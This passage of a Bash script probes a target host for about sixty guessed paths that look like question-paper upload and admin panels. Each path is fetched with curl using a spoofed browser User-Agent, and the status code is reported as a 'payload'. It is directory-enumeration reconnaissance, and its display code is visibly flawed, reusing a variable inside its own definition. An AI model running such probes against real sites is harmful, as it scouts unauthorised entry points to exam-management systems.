code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtAutomation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtAutomation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

